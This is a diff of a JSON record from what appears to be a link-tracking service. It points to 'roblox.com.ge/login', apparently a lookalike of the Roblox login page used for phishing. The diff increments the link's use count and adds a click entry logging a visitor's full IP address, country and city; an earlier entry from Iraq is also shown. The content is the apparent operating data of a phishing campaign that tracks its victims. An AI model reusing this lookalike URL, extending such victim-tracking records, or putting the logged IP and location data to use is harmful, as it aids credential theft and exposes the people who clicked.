@@ -142,7 +142,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1202,
+    "useCount": 1203,
     "createdBy": "admin",
     "clicks": [
       {
@@ -9760,6 +9760,14 @@
         "city": "Erbil",
         "flag": "🇮🇶",
         "countryCode": "IQ"
+      },
+      {
+        "timestamp": 1777308101986,
+        "ip": "202.179.3.135",
+        "country": "Mongolia",
+        "city": "Ulan Bator",
+        "flag": "🇲🇳",
+        "countryCode": "MN"
       }
     ]
   },
